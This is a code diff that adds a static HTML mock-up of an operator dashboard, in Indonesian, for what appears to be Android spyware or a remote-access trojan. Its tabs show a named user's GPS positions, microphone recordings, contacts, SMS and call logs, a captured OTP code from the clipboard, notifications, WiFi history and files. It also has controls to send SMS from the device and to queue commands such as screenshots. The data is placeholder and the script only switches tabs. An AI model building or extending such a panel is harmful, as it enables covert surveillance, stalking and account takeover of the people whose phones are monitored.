@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Admin - Detail User</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 24px; }
+    .tabs { display: flex; gap: 8px; margin-bottom: 20px; }
+    .tab { background: #eee; padding: 8px 12px; border-radius: 5px; cursor: pointer; }
+    .tab.active { background: #2376e2; color: #fff; }
+    .section { display: none; }
+    .section.active { display: block; }
+    table { width: 100%; border-collapse: collapse; margin-bottom: 18px; }
+    th, td { border: 1px solid #ddd; padding: 6px 10px; }
+    th { background: #f5f5f5; }
+    .tag { display: inline-block; padding: 2px 8px; border-radius: 4px; background: #eee; }
+    .tag.green { background: #99ffbb; color: #045d1c; }
+    .tag.red { background: #ffcccc; color: #b20000; }
+  </style>
+</head>
+<body>
+  <h2>Detail User - Budi Santoso</h2>
+  <div>
+    <b>Nomor HP:</b> 0812xxxxxxx |
+    <b>Status:</b> <span class="tag green">Aktif</span> |
+    <b>Last Active:</b> 2025-08-03 07:00
+  </div>
+  <div class="tabs" id="tab-buttons">
+    <div class="tab active">GPS Logging</div>
+    <div class="tab">Microphone Recording</div>
+    <div class="tab">Contacts</div>
+    <div class="tab">SMS Logs</div>
+    <div class="tab">Send SMS</div>
+    <div class="tab">Call Logs</div>
+    <div class="tab">Installed Apps</div>
+    <div class="tab">Stub Permissions</div>
+    <div class="tab">Clipboard</div>
+    <div class="tab">Notifications</div>
+    <div class="tab">WiFi Networks</div>
+    <div class="tab">File Explorer</div>
+    <div class="tab">Command Queue</div>
+  </div>
+
+  <div class="section active">
+    <h4>GPS Logging</h4>
+    <table>
+      <tr><th>Waktu</th><th>Lat</th><th>Long</th></tr>
+      <tr><td>2025-08-01 10:23</td><td>-6.200</td><td>106.816</td></tr>
+      <tr><td>2025-08-01 12:11</td><td>-6.210</td><td>106.820</td></tr>
+    </table>
+  </div>
+  <div class="section">
+    <h4>Microphone Recording</h4>
+    <table>
+      <tr><th>Waktu</th><th>File</th></tr>
+      <tr><td>2025-08-01 08:00</td><td><a href="#">audio1.mp3</a></td></tr>
+      <tr><td>2025-08-02 14:10</td><td><a href="#">audio2.mp3</a></td></tr>
+    </table>
+  </div>
+  <div class="section">
+    <h4>Contacts</h4>
+    <table>
+      <tr><th>Nama</th><th>Nomor</th></tr>
+      <tr><td>Andi</td><td>081234567890</td></tr>
+      <tr><td>Siti</td><td>082198765432</td></tr>
+    </table>
+  </div>
+  <div class="section">
+    <h4>SMS Logs</h4>
+    <table>
+      <tr><th>Arah</th><th>Nomor</th><th>Isi</th><th>Waktu</th></tr>
+      <tr><td>IN</td><td>081211122233</td><td>Halo</td><td>2025-08-01 09:00</td></tr>
+      <tr><td>OUT</td><td>081244455566</td><td>Siap</td><td>2025-08-01 09:05</td></tr>
+    </table>
+  </div>
+  <div class="section">
+    <h4>Send SMS</h4>
+    <form>
+      <input type="text" placeholder="Nomor Tujuan" value="0812xxxxxxx">
+      <textarea rows="2" placeholder="Isi pesan..."></textarea>
+      <button type="submit">Kirim SMS</button>
+    </form>
+  </div>
+  <div class="section">
+    <h4>Call Logs</h4>
+    <table>
+      <tr><th>Tipe</th><th>Nomor</th><th>Durasi</th><th>Waktu</th></tr>
+      <tr><td>OUTGOING</td><td>081255566677</td><td>120</td><td>2025-08-01 10:00</td></tr>
+      <tr><td>INCOMING</td><td>081299988877</td><td>60</td><td>2025-08-01 13:30</td></tr>
+    </table>
+  </div>
+  <div class="section">
+    <h4>Installed Apps</h4>
+    <table>
+      <tr><th>App</th><th>Package</th><th>Versi</th></tr>
+      <tr><td>WhatsApp</td><td>com.whatsapp</td><td>2.24.11</td></tr>
+      <tr><td>Instagram</td><td>com.instagram.android</td><td>300.1.0</td></tr>
+    </table>
+  </div>
+  <div class="section">
+    <h4>Stub Permissions</h4>
+    <table>
+      <tr><th>Permission</th><th>Status</th><th>Update</th></tr>
+      <tr><td>GPS</td><td><span class="tag green">Granted</span></td><td>2025-08-01 14:00</td></tr>
+      <tr><td>Mic</td><td><span class="tag red">Denied</span></td><td>2025-08-01 14:00</td></tr>
+      <tr><td>Kontak</td><td><span class="tag green">Granted</span></td><td>2025-08-01 14:00</td></tr>
+    </table>
+  </div>
+  <div class="section">
+    <h4>Clipboard</h4>
+    <ul>
+      <li>2025-08-01 11:00: Kode OTP: 123456</li>
+    </ul>
+  </div>
+  <div class="section">
+    <h4>Notifications</h4>
+    <ul>
+      <li>2025-08-01 15:30: <b>WhatsApp</b> - Pesan baru masuk</li>
+    </ul>
+  </div>
+  <div class="section">
+    <h4>WiFi Networks</h4>
+    <table>
+      <tr><th>SSID</th><th>Waktu</th><th>Lokasi</th></tr>
+      <tr><td>RumahAja</td><td>2025-08-01 08:00</td><td>Jakarta</td></tr>
+      <tr><td>Kantor1</td><td>2025-07-31 17:00</td><td>Jakarta</td></tr>
+    </table>
+  </div>
+  <div class="section">
+    <h4>File Explorer</h4>
+    <table>
+      <tr><th>Path</th><th>Ukuran</th><th>Action</th></tr>
+      <tr><td>/storage/Download/file1.pdf</td><td>2MB</td><td><button>Download</button></td></tr>
+      <tr><td>/storage/DCIM/photo.jpg</td><td>1.2MB</td><td><button>Download</button></td></tr>
+    </table>
+  </div>
+  <div class="section">
+    <h4>Command Queue</h4>
+    <table>
+      <tr><th>Perintah</th><th>Status</th><th>Waktu</th></tr>
+      <tr><td>Reboot Device</td><td>Selesai</td><td>2025-08-01 09:00</td></tr>
+      <tr><td>Request Screenshot</td><td>Pending</td><td>2025-08-01 12:05</td></tr>
+    </table>
+  </div>
+  <script>
+    // Tab functionality
+    const tabs = document.querySelectorAll('.tab');
+    const sections = document.querySelectorAll('.section');
+    tabs.forEach((tab, i) => {
+      tab.onclick = () => {
+        tabs.forEach(t => t.classList.remove('active'));
+        sections.forEach(s => s.classList.remove('active'));
+        tab.classList.add('active');
+        sections[i].classList.add('active');
+      };
+    });
+  </script>
+</body>
+</html>
